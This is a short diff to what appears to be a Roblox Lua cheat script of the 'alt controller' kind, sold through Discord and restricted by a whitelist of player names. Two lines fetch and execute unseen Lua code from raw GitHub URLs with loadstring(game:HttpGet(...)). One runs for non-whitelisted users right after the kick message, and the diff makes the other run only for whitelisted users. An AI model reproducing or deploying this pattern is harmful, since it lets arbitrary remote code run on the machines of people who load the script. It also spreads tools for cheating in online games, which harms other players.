@@ -19,7 +19,7 @@ local AltControllers = {
 
 local p = game:GetService("Players").LocalPlayer
 if not table.find(AltControllers, p.Name) then
-    p:Kick("Not On Whitelist, Buy The Script.")
+    p:Kick("Not On Whitelist, Buy The Script. discord.gg/TRShpFeqGK")
     loadstring(game:HttpGet("https://raw.githubusercontent.com/randomalotfornoreason/IlIlIlI/main/IlIlIlIlI", true))()
 end
 
@@ -112,7 +112,12 @@ else
     Text = "discord.gg/TRShpFeqGK | grief#0002";
     Duration = 20
 })
-loadstring(game:HttpGet("https://raw.githubusercontent.com/nanosgithubaccount/g/main/g", true))()
+    
+if not table.find(AltControllers, p.Name) then
+        return
+   else
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/nanosgithubaccount/g/main/g", true))()
+    end
 end
 
 local Toggle = true
